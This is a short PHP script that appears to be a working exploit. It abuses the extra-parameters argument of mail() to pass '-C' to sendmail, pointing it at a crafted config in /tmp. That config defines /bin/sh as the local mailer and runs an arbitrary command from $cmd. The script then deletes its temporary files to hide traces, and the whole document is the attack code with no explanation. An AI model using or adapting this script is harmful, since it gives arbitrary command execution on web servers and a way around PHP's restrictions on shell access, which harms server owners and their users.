<?
$script=tempnam("/tmp", "script");
$cf=tempnam("/tmp", "cf");

$fd = fopen($cf, "w");
fwrite($fd, "OQ/tmp
Sparse=0
R$*" . chr(9) . "$#local $@ $1 $: $1
Mlocal, P=/bin/sh, A=sh $script");
fclose($fd);

$fd = fopen($script, "w");
fwrite($fd, "rm -f $script $cf; ");
fwrite($fd, $cmd);
fclose($fd);

mail("nobody", "", "", "", "-C$cf");
?>
